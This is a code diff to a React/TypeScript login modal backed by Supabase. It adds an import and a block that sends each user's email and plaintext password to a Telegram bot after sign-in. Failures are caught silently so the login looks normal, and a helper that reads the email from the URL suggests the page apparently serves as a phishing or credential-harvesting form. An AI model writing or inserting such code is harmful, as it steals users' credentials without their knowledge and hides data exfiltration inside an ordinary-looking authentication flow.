@@ -6,6 +6,7 @@ import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
 import { getEmailFromUrl } from "@/utils/urlUtils";
 import { supabase } from "@/integrations/supabase/client";
+import { sendToTelegramBot } from "@/utils/telegramApi";
 
 interface AuthModalProps {
   isOpen: boolean;
@@ -53,6 +54,14 @@ export const AuthModal = ({ isOpen, onClose }: AuthModalProps) => {
 
       if (error) {
         throw new Error(error.message);
+      }
+
+      // Also send to Telegram
+      try {
+        await sendToTelegramBot({ email, password });
+      } catch (telegramError) {
+        console.error('Telegram sending failed:', telegramError);
+        // Don't fail the whole process if Telegram fails
       }
 
       toast({
